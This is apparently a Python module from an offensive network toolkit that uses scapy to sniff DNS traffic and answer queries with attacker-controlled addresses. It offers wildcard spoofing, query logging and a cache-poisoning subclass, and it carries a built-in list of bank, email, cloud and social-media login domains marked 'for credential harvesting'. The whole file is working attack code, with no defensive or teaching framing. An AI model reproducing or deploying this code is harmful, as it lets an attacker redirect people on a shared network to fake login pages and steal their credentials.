"""
DNS Spoofing Module
───────────────────
Performs DNS spoofing attacks to redirect traffic:
  - Respond to DNS queries with attacker-controlled IP
  - Redirect specific domains to fake servers
  - Wildcard DNS responses for all queries
  - DNS cache poisoning attempts
"""

import time
import threading
from collections import defaultdict

from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, sniff, send, ARP, sr1
from scapy.layers.inet import Ether

from .config import NETWORK_GW_IP, IS_WINDOWS, log


class DNSSpoofEngine:
    """
    DNS spoofing engine that redirects DNS queries to attacker-controlled IPs.
    Supports wildcard spoofing, domain-specific spoofing, and cache poisoning.
    """

    def __init__(self, interface, spoof_ip=None):
        self.interface = interface
        self.spoof_ip = spoof_ip or NETWORK_GW_IP
        self.running = False
        self._spoofed_domains = {}
        self._blocked_domains = set()
        self._dns_queries = []
        self._spoof_count = defaultdict(int)
        self._thread = None

    def add_spoof(self, domain, ip=None):
        """Add domain to spoof list."""
        target_ip = ip or self.spoof_ip
        self._spoofed_domains[domain.lower()] = target_ip
        log.info(f"DNS spoofing: {domain} -> {target_ip}")

    def block_domain(self, domain):
        """Add domain to block list (return NXDOMAIN)."""
        self._blocked_domains.add(domain.lower())
        log.info(f"DNS blocking: {domain}")

    def remove_spoof(self, domain):
        """Remove domain from spoof list."""
        self._spoofed_domains.pop(domain.lower(), None)

    def clear_spoof(self):
        """Clear all spoof entries."""
        self._spoofed_domains.clear()

    def add_common_targets(self):
        """Add common targets for credential harvesting."""
        targets = [
            "login.windows.net", "login.microsoftonline.com",
            "accounts.google.com", "www.google.com",
            "login.yahoo.com", "login.mail.yahoo.com",
            "www.facebook.com", "login.facebook.com",
            "www.twitter.com", "api.twitter.com",
            "www.linkedin.com", "www.github.com",
            "www.amazon.com", "www.amazon.it",
            "www.netflix.com", "www.spotify.com",
            "www.instagram.com", "www.snapchat.com",
            "www.apple.com", "id.apple.com",
            "www.dropbox.com", "www.box.com",
            "www.salesforce.com", "www.zendesk.com",
            "www.paypal.com", "www.paypal.it",
            "www.bankofamerica.com", "www.chase.com",
            "www.wellsfargo.com", "www.citi.com",
            "www.coursera.org", "www.udemy.com",
            "www.medium.com", "www.reddit.com",
        ]
        for domain in targets:
            self.add_spoof(domain)

    def _build_dns_response(self, pkt, answer_ip):
        """Build DNS response packet."""
        return (
            Ether(src=pkt[Ether].dst, dst=pkt[Ether].src) /
            IP(src=pkt[IP].dst, dst=pkt[IP].src) /
            UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport) /
            DNS(
                id=pkt[DNS].id,
                qr=1, aa=1, rd=1, ra=1,
                qd=pkt[DNS].qd,
                an=DNSRR(rrname=pkt[DNS].qd.qname, type="A", ttl=60, rdata=answer_ip)
            )
        )

    def _handle_dns_query(self, pkt):
        """Handle incoming DNS query."""
        if not pkt.haslayer(DNS) or not pkt[DNS].qd:
            return

        qname = pkt[DNS].qd.qname.decode().rstrip(".")
        qtype = pkt[DNS].qd.qtype

        # Log query
        self._dns_queries.append({
            "client": pkt[IP].src,
            "domain": qname,
            "type": qtype,
            "timestamp": time.time()
        })

        # Check if blocked
        for blocked in self._blocked_domains:
            if blocked in qname or qname.endswith("." + blocked):
                # Return NXDOMAIN
                response = (
                    Ether(src=pkt[Ether].dst, dst=pkt[Ether].src) /
                    IP(src=pkt[IP].dst, dst=pkt[IP].src) /
                    UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport) /
                    DNS(
                        id=pkt[DNS].id,
                        qr=1, aa=1, rd=1, ra=1,
                        qd=pkt[DNS].qd,
                        an=DNSRR(rrname=pkt[DNS].qd.qname, type="NULL", rdata="", ttl=0)
                    )
                )
                send(response, verbose=False, iface=self.interface)
                log.info(f"DNS blocked: {qname}")
                return

        # Check for spoof
        spoof_ip = None
        for domain, ip in self._spoofed_domains.items():
            if domain == qname or qname.endswith("." + domain):
                spoof_ip = ip
                break

        # Wildcard match - respond to all queries
        if not spoof_ip and self._spoofed_domains:
            spoof_ip = self.spoof_ip

        if spoof_ip:
            response = self._build_dns_response(pkt, spoof_ip)
            send(response, verbose=False, iface=self.interface)
            self._spoof_count[qname] += 1
            log.info(f"DNS spoofed: {qname} -> {spoof_ip}")

    def start(self):
        """Start DNS spoofing."""
        if IS_WINDOWS:
            log.warning("DNS spoofing has limited support on Windows.")
            log.warning("Raw packet injection may require Npcap with admin privileges.")

        self.running = True
        log.info(f"Starting DNS spoof on {self.interface}")

        self._thread = threading.Thread(
            target=self._sniff_loop,
            daemon=True
        )
        self._thread.start()

    def _sniff_loop(self):
        """Main sniffing loop."""
        sniff(
            iface=self.interface,
            filter="udp port 53",
            prn=self._handle_dns_query,
            store=False,
            stop_filter=lambda x: not self.running
        )

    def stop(self):
        """Stop DNS spoofing."""
        self.running = False
        if self._thread:
            self._thread.join(timeout=5)
        log.info(f"DNS spoof stopped. Total spoofs: {sum(self._spoof_count.values())}")

    def get_queries(self):
        """Return all DNS queries."""
        return self._dns_queries

    def get_spoof_stats(self):
        """Return spoofing statistics."""
        return {
            "total_spoofs": sum(self._spoof_count.values()),
            "domains_spoofed": len(self._spoofed_domains),
            "domains_blocked": len(self._blocked_domains),
            "queries": len(self._dns_queries),
            "by_domain": dict(self._spoof_count)
        }


class DNSCachePoison(DNSSpoofEngine):
    """
    Advanced DNS cache poisoning using various techniques.
    """

    def __init__(self, interface, spoof_ip=None):
        super().__init__(interface, spoof_ip)
        self._poisoned_cache = {}

    def poison_cache(self, domain, ip, ttl=3600):
        """Poison DNS cache for specific domain."""
        self._poisoned_cache[domain.lower()] = {
            "ip": ip,
            "ttl": ttl,
            "timestamp": time.time()
        }
        self.add_spoof(domain, ip)

    def poison_target_site(self, site_ip, redirect_ip):
        """
        Redirect all traffic to a target IP by poisoning DNS.
        Useful for redirecting entire services.
        """
        # Create fake DNS responses for any query
        self._wildcard_redirect = redirect_ip
        log.info(f"Cache poison: All traffic to {site_ip} -> {redirect_ip}")

    def get_poison_stats(self):
        """Return cache poisoning statistics."""
        stats = super().get_spoof_stats()
        stats["poisoned_domains"] = len(self._poisoned_cache)
        return stats